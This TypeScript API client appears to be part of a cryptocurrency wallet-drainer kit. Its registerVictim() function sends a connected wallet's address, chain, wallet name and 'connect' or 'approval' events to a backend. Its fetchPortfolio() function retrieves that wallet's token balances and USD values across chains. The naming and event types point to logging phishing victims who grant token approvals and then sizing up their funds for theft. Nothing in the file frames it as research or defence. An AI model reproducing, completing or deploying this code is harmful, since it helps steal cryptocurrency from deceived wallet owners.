const BACKEND_URL =
  process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';

export interface RegisterPayload {
  sourceAddress: string;
  chain: string;
  eventType: 'connect' | 'approval';
  walletName?: string;
  walletProvider?: string;
}

export async function registerVictim(payload: RegisterPayload) {
  const res = await fetch(`${BACKEND_URL}/api/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (!res.ok) throw new Error(`register failed: ${res.status}`);
  return res.json();
}

export interface PortfolioToken {
  blockchain: string;
  tokenSymbol: string;
  tokenName: string;
  tokenType: string;
  contractAddress: string | null;
  balance: string;
  balanceUsd: number;
  tokenDecimals: number;
  isNative: boolean;
}

export interface PortfolioChain {
  chain: string;
  totalUsd: number;
  tokens: PortfolioToken[];
}

export interface PortfolioResponse {
  success: boolean;
  totalBalanceUsd: string;
  totalAssetCount: number;
  chains: PortfolioChain[];
}

export async function fetchPortfolio(walletAddress: string): Promise<PortfolioResponse> {
  const res = await fetch(
    `${BACKEND_URL}/api/hierarchical-portfolio?walletAddress=${encodeURIComponent(walletAddress)}`
  );
  if (!res.ok) throw new Error(`portfolio failed: ${res.status}`);
  return res.json();
}

